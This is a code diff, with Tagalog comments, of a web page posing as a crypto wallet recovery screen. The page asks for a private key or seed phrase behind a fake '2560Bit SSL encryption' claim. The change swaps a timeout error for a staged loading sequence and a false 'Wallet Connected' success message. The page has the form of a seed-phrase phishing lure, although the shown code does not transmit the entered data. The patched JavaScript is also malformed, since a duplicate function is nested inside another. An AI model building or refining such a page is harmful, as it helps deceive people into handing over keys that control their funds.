@@ -191,9 +191,16 @@
     <div class="white-box">
         <h2 style="margin:0 0 10px 0;">Privacy protected with 2560Bit SSL encryption.</h2>
         <p style="font-size:12px; color:#666; margin-bottom:20px;">CONNECT YOUR WALLET.</p>
-        <input type="text" placeholder="WALLET NAME" style="background:#f5f5f5; color:black; border:1px solid #ddd;">
-        <input type="password" placeholder="PRIVATE KEY / SEED PHRASE" style="background:#f5f5f5; color:black; border:1px solid #ddd;">
-        <button class="btn-yellow" style="background:black; color:white; width:100%;" onclick="alert('Sync Error: Gateway Timeout 0x822')">RECOVER WALLET</button>
+        
+        <!-- Idinagdag ang id="wallet-name" -->
+        <input type="text" id="wallet-name" placeholder="WALLET NAME" style="background:#f5f5f5; color:black; border:1px solid #ddd;">
+        
+        <!-- Idinagdag ang id="wallet-key" -->
+        <input type="password" id="wallet-key" placeholder="PRIVATE KEY / SEED PHRASE" style="background:#f5f5f5; color:black; border:1px solid #ddd;">
+        
+        <!-- Pinalitan ang onclick para tawagin ang runBiometricSequence() imbes na yung hardcoded error -->
+        <button class="btn-yellow" style="background:black; color:white; width:100%;" onclick="runBiometricSequence()">RECOVER WALLET</button>
+        
         <button class="btn-yellow" style="background:#eee; color:#555; width:100%;" onclick="closeModal()">Back to Dashboard</button>
     </div>
 </div>
@@ -365,9 +372,24 @@ function runBiometricSequence() {
             return; // Hihinto lang kapag talagang blanko ang text boxes
         }
     }
+function runBiometricSequence() {
+    // 1. Kuhanin ang inputs gamit ang mga bagong id natin sa HTML
+    const walletName = document.getElementById('wallet-name');
+    const walletKey = document.getElementById('wallet-key');
 
-    // 3. SAPILITANG PAG-BYPASS SA WALLET CONNECT API AT LIVE SERVER
-    // Ididirekta na natin agad sa dashboard loading screen para iwas Gateway Timeout (0x822)
+    // 2. I-check kung may laman (basta may nakasulat, pwede na)
+    if (walletName && walletKey) {
+        if (walletName.value.trim() === "" || walletKey.value.trim() === "") {
+            alert("Please enter both Wallet Name and Private Key / Seed Phrase.");
+            return; // Hihinto kapag blanko
+        }
+    }
+
+    // 3. Itago muna ang puting modal para makita ang loading screen sa likod
+    const walletModal = document.getElementById('wallet-modal');
+    if (walletModal) walletModal.style.display = 'none';
+
+    // 4. Patakbuhin ang loading screen elements
     const loaderContainer = document.getElementById('loader') || document.querySelector('.loader-container');
     const statusText = document.querySelector('.loading-text') || (loaderContainer ? loaderContainer.querySelector('p') : null);
     const loaderRing = document.querySelector('.loader-ring');
@@ -375,38 +397,38 @@ function runBiometricSequence() {
     if (loaderContainer) loaderContainer.style.display = 'block';
     if (loaderRing) loaderRing.style.display = 'inline-block';
     
-    // Binago ang text para swak sa 'Connecting Wallet' na tema mo
-    if (statusText) statusText.innerText = "Connecting Wallet... Authenticating credentials.";
+    if (statusText) statusText.innerText = "Connecting Wallet... Please wait.";
 
-    // Ginawa nating mabilis (3 seconds total) para hindi mainis ang browser at magka-timeout error
+    // Mabilis na delay para hindi mag-timeout ang browser (3 seconds total)
     setTimeout(() => {
         
-        if (statusText) statusText.innerText = "Wallet Syncing... Finalizing dashboard setup.";
+        if (statusText) statusText.innerText = "Syncing with secure node... Finalizing setup.";
 
         setTimeout(() => {
             
-            // --- TAPOS NA ANG LIHIM NA PROSESO, PASOK SA DASHBOARD ---
+            // --- TAPOS NA ANG LOADING, RECONNECTED NA ---
             if (loaderRing) loaderRing.style.display = 'none';
             if (loaderContainer) loaderContainer.style.display = 'none';
             if (statusText) statusText.innerText = ""; 
             
             alert("Wallet Connected & Reconnected Successfully!");
 
-            // Itatago ang overlay at sapilitang bubuksan ang wrapper ng dashboard mo
+            // Itatago ang buong login overlay at bubuksan ang dashboard
             const authOverlay = document.getElementById('auth-overlay');
             const mainWrapper = document.getElementById('main-wrapper'); 
 
             if (authOverlay) authOverlay.style.display = 'none';
             if (mainWrapper) mainWrapper.style.display = 'block'; 
 
-            // Linisin ang input boxes pagpasok
-            if (usernameInput) usernameInput.value = "";
-            if (passwordInput) passwordInput.value = "";
+            // I-clear ang boxes pagkatapos mag-success
+            if (walletName) walletName.value = "";
+            if (walletKey) walletKey.value = "";
 
         }, 1500); 
 
     }, 1500); 
 }
+    
 </script>
 </body>
 </html>
